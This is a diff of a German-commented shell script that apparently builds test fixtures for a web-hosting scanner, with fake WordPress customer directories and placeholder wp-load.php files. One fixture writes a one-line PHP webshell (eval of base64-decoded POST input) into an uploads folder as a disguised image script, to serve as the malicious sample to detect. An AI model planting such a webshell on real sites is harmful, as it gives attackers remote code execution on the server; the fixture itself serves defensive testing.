@@ -71,6 +71,7 @@ define('DB_HOST', 'localhost');
 $table_prefix = 'wp_';
 PHP
   printf '<?php\n// harmlos\n' > "${k1}/index.php"
+  printf '<?php\n// wp-load\n' > "${k1}/wp-load.php"
 
   # ── Kunde 2: WordPress mit Schadcode + Joomla + Nextcloud ───
   local k2="${W}/kunde-zwei.example/httpdocs"
@@ -83,6 +84,7 @@ define('DB_PASSWORD', 'nicht-echt-nur-pruefstand');
 define('DB_HOST', 'localhost');
 $table_prefix = 'wp_';
 PHP
+  printf '<?php\n// wp-load\n' > "${k2}/wp-load.php"
   # Webshell im Uploads-Verzeichnis — PHP gehoert dort nie hin.
   printf '<?php eval(base64_decode($_POST["c"])); ?>\n' \
     > "${k2}/wp-content/uploads/2026/03/bild.php"
@@ -187,6 +189,8 @@ define('DB_PASSWORD', 'nicht-echt-nur-pruefstand');
 define('DB_HOST', 'localhost');
 $table_prefix = 'wp_';
 PHP
+
+  printf '<?php\n// wp-load\n' > "${k3}/wp-load.php"
 
   # ── Sicherungskopien: duerfen NICHT als eigene Instanzen zaehlen ──
   # Die Tiefe ist Teil des Pruefgegenstands: Abschnitt 12b sucht mit
